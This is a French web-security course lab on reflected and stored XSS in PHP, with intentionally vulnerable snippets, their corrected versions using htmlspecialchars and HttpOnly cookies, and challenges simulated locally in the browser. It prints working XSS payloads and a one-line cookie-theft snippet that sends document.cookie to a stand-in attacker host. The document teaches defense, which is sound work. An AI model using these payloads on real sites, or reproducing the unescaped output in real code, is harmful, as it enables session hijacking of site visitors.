---
description: "Deuxième TP de la série sécurité : comprendre les failles XSS réfléchies et stockées, les tester sur une démonstration, puis corriger le code vulnérable."
---

# TP 2 : Les failles XSS

::: details Sommaire
[[toc]]
:::

Au [TP précédent](./tp1_injection_sql.md), la donnée de l'utilisateur devenait du **code SQL** exécuté par la base. Cette fois, elle va devenir du **code HTML / JavaScript** exécuté par le navigateur des visiteurs. C'est la faille **XSS** (Cross-Site Scripting), l'une des plus répandues du Web.

Même méthode que d'habitude : on observe, on teste, on comprend, on corrige.

## Les slides

Un tour rapide de la notion avant de manipuler : pourquoi le navigateur exécute la saisie d'un utilisateur, et comment l'en empêcher.

<ClientOnly>
<SlidesDeck src="securite_xss" />
</ClientOnly>

## Prérequis

- Avoir suivi le [TP 1 sur les injections SQL](./tp1_injection_sql.md).
- Des bases de HTML et de JavaScript (les balises, `document.cookie`).

## Objectifs

À la fin de ce TP vous saurez :

- Expliquer la différence entre une XSS réfléchie et une XSS stockée.
- Comprendre en quoi une XSS permet de voler une session.
- Corriger une faille XSS en échappant l'affichage (`htmlspecialchars`).
- Choisir entre échapper et supprimer les balises selon le contexte.

## Le principe en une phrase

Une XSS survient quand une **saisie utilisateur** est réaffichée dans une page **sans être échappée**, si bien que le navigateur l'exécute comme du HTML ou du JavaScript.

## Exercice 1 : la faille réfléchie en direct

Commençons par la voir fonctionner. Voici un mini-site volontairement vulnérable : il affiche une image dont l'adresse vient d'un champ de saisie.

<Sample src="xss" />

La même chose, mais interactive et avec le HTML généré sous les yeux (et le correctif à un clic) :

<ClientOnly>
<XssLab type="reflechie" />
</ClientOnly>

Le code derrière ce champ construit une balise `<img src="...">` à partir de votre saisie, sans la filtrer. Une balise `img`, vous connaissez : elle a un attribut `src`… mais aussi un attribut `onload` qui exécute du JavaScript une fois l'image chargée.

::: danger À tester ensemble
Dans le champ de saisie, essayez :

```
https://fakeimg.pl/300/" onload="alert('Coucou')
```

Que se passe-t-il ? Pourquoi ? Regardons le code source généré ensemble.
:::

::: details Question : d'où vient l'exécution du code ?
Notre saisie **ferme** l'attribut `src` (grâce au `"`) puis en **ajoute un nouveau**, `onload`, qui contient du JavaScript. Le navigateur reçoit un HTML parfaitement valide et exécute donc le `onload`. Nous n'avons pas « piraté » le site, nous avons profité du fait qu'il colle notre saisie telle quelle dans son HTML.
:::

On parle de XSS **réfléchie** : le code voyage dans la saisie (ou dans l'URL) et n'affecte que la personne qui l'envoie… ou celle à qui on envoie le lien piégé.

## Exercice 2 : le mini-bug qui cache une faille (observer et corriger)

Observez cette page, appelée avec `page.php?name=John` :

```php
<?php
echo "<h2>Bonjour $_GET['name']</h2>";
?>
```

::: details Question : ce code fonctionne-t-il seulement ?
Non. `"<h2>Bonjour $_GET['name']</h2>"` provoque une **erreur de syntaxe** PHP : on ne peut pas écrire `$_GET['name']` avec des quotes simples à l'intérieur d'une chaîne à guillemets sans accolades. Il faudrait `{$_GET['name']}`. C'est un bon réflexe d'examen : un code peut être à la fois **buggé** et **vulnérable**.
:::

::: details Question : une fois le bug corrigé, où est la faille ?
La valeur de `name` est réaffichée **sans échappement**. Avec `?name=<script>alert(1)</script>`, le script s'exécute. C'est une XSS réfléchie : dangereuse car l'attaquant peut envoyer à une victime un lien du type `page.php?name=<script>...</script>` qui exécutera son code dans le navigateur de la victime (vol de cookie, redirection, faux formulaire…).
:::

Corrigez le code : il doit fonctionner **et** être sûr.

::: details Voir l'une des solutions possibles
```php
<?php
$name = htmlspecialchars($_GET['name'] ?? '', ENT_QUOTES, 'UTF-8');
echo "<h2>Bonjour {$name}</h2>";
?>
```

`htmlspecialchars` transforme `<script>` en `&lt;script&gt;` : le navigateur l'affiche comme du **texte**, il ne l'exécute pas.
:::

## Exercice 3 : la faille dans un formulaire (corriger)

Un grand classique. Le formulaire renvoie le nom et l'email saisis :

```php
<?php
if (isset($_POST['name']) && isset($_POST['email'])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    echo "<h2>Bonjour $name</h2>";
    echo "<p>Votre email est $email</p>";
}
?>
<form action="page.php" method="post">
    <input type="text" name="name" placeholder="Nom">
    <input type="email" name="email" placeholder="Email">
    <button type="submit">Envoyer</button>
</form>
```

::: tip Rappel : deux fonctions utiles
- `htmlspecialchars($valeur)` : **neutralise** les caractères spéciaux (`<`, `>`, `"`…) en entités HTML. La saisie s'affiche telle quelle, mais n'est pas exécutée. C'est la solution recommandée **à l'affichage**.
- `strip_tags($valeur)` : **supprime** purement et simplement les balises HTML. Utile quand vous ne voulez accepter aucune mise en forme.
:::

À vous de corriger l'affichage.

::: details Voir l'une des solutions possibles
```php
<?php
if (isset($_POST['name']) && isset($_POST['email'])) {
    $name = htmlspecialchars($_POST['name'], ENT_QUOTES, 'UTF-8');
    $email = htmlspecialchars($_POST['email'], ENT_QUOTES, 'UTF-8');
    echo "<h2>Bonjour $name</h2>";
    echo "<p>Votre email est $email</p>";
}
?>
```
:::

## Exercice 4 : la XSS stockée (la plus dangereuse)

Jusqu'ici, seule la victime qui envoie le code piégé était touchée. Cette fois, le code est **enregistré en base** : il frappe **tous** les visiteurs. Voici une page de commentaires :

```php
<?php
// Récupère les commentaires
$request = "SELECT * FROM comments";
$comments = $pdo->query($request)->fetchAll(PDO::FETCH_ASSOC);

// Ajout d'un commentaire
if (isset($_POST['content'])) {
    $content = $_POST['content'];
    $request = "INSERT INTO comments (content) VALUES (?)";
    $pdo->prepare($request)->execute([$content]);
}
?>

<h1>Commentaires</h1>
<ul>
    <?php foreach ($comments as $comment): ?>
        <li><?= $comment['content'] ?></li>
    <?php endforeach; ?>
</ul>

<form>
    <textarea name="content" rows="3"></textarea>
    <button type="submit">Envoyer</button>
</form>
```

::: details Question : l'insertion en base est-elle vulnérable à l'injection SQL ?
Non, elle utilise une requête préparée (`VALUES (?)`), c'est correct. Le problème n'est pas l'enregistrement, c'est l'**affichage**.
:::

::: details Question : pourquoi est-ce une XSS stockée ?
Un visiteur peut poster un commentaire contenant `<script>...</script>`. Ce contenu est enregistré tel quel, puis réaffiché **sans échappement** (`<?= $comment['content'] ?>`) à **chaque** visiteur de la page. Un seul commentaire piégé compromet donc tout le monde, jusqu'à ce qu'on le supprime.
:::

::: details Question : le formulaire fonctionne-t-il d'ailleurs ?
Non : il n'a ni `method="post"` ni `action`. Par défaut il enverrait en `GET`, donc `$_POST['content']` resterait vide. Un bug à corriger en même temps.
:::

Avant de corriger, voyez la faille frapper un **autre** visiteur. Postez un commentaire piégé, puis rechargez la page « dans le navigateur de Bob » : le code s'exécute chez lui, et peut même voler son cookie de session.

<ClientOnly>
<XssLab type="livre" />
</ClientOnly>

Deux solutions sont possibles pour la faille XSS. À vous de les mettre en place.

::: tip Point de contrôle
Après correction, un commentaire contenant `<script>alert(1)</script>` doit s'**afficher comme du texte** (ou être nettoyé), jamais s'exécuter, et le formulaire doit bien enregistrer en base.
:::

::: details Voir l'une des solutions possibles
**Solution 1 (recommandée) : échapper à l'affichage.** On stocke la saisie brute, on l'échappe seulement au moment de l'afficher.

```php
<li><?= htmlspecialchars($comment['content'], ENT_QUOTES, 'UTF-8') ?></li>
```

**Solution 2 : nettoyer à l'enregistrement.** On supprime les balises avant d'insérer.

```php
$content = strip_tags($_POST['content']);
$pdo->prepare("INSERT INTO comments (content) VALUES (?)")->execute([$content]);
```

La solution 1 est préférable : elle garde la donnée d'origine intacte et protège **au bon endroit** (l'affichage). Sans oublier de corriger le formulaire :

```html
<form method="post" action="commentaires.php">
    <textarea name="content" rows="3"></textarea>
    <button type="submit">Envoyer</button>
</form>
```
:::

## Pourquoi c'est si grave : le vol de session

Une alerte `alert(1)`, c'est spectaculaire mais inoffensif. Le vrai danger, c'est ce que le JavaScript injecté peut faire **à la place** :

```javascript
new Image().src = "http://pirate.com/?c=" + document.cookie;
```

Ce code envoie discrètement le **cookie de session** de la victime vers le serveur de l'attaquant, qui peut alors se connecter **à sa place**, sans mot de passe.

::: tip Une défense en profondeur
En posant le cookie de session avec l'option `HttpOnly`, on interdit à JavaScript d'y accéder :

```php
setcookie('session', $id, ['httponly' => true, 'secure' => true, 'samesite' => 'Strict']);
```

Même en cas de XSS, `document.cookie` ne verra plus le cookie de session. On combine toujours les deux : échapper l'affichage **et** protéger le cookie. Nous reviendrons sur les cookies sécurisés au [TP 4](./tp4_authentification.md).
:::

## À vous d'attaquer

Vous avez vu la faille et appris à la corriger. Passons de l'autre côté : rien de tel que de réussir une attaque soi-même pour la comprendre. Quatre épreuves, chacune sur une page isolée dans votre navigateur ; la progression se coche quand vous y arrivez.

::: warning Un rappel important
Ces techniques ne se pratiquent **que** sur des systèmes qu'on vous autorise explicitement à tester. Ici, tout est simulé localement dans votre navigateur : aucune donnée réelle, aucun serveur. Les utiliser sur un système tiers sans autorisation est un délit.
:::

<ClientOnly>
<XssLab type="defis" />
</ClientOnly>

Les quatre épreuves, dans l'ordre :

1. **XSS réfléchie** : faites exécuter du JavaScript via un champ recopié dans une balise `<img>`.
2. **Contourner un filtre naïf** : le site retire les `<script>`, mais pas un `onerror` sur une autre balise.
3. **XSS stockée** : un message piégé qui s'exécute chez **un autre** visiteur (Bob), pas seulement chez vous.
4. **Vol de session** : le même message, mais qui envoie le **cookie** de Bob vers le serveur de l'attaquant.

Sur chaque épreuve, basculez sur « affichage échappé » et retentez : `htmlspecialchars` neutralise l'attaque à chaque fois.

## À retenir

- Une XSS, c'est une **saisie exécutée** par le navigateur, faute d'échappement.
- **Réfléchie** : le code voyage dans l'URL / un lien (une victime à la fois).
- **Stockée** : le code est en base, il touche **tous** les visiteurs.
- On corrige en **échappant à l'affichage** : `htmlspecialchars`.
- Une XSS permet le **vol de session** ; le cookie `HttpOnly` limite les dégâts.

## Conclusion

Vous savez désormais reconnaître et corriger les deux grandes formes de XSS. Dans ce TP vous avez appris à :

- Exploiter une XSS réfléchie sur une démonstration pour bien comprendre le mécanisme.
- Repérer une XSS stockée dans une page de commentaires.
- Échapper l'affichage au bon endroit et protéger le cookie de session.

Au [TP 3](./tp3_controle_acces.md), on change d'angle : ce n'est plus le contenu qui est piégé, mais l'**accès** aux ressources qui n'est pas contrôlé.
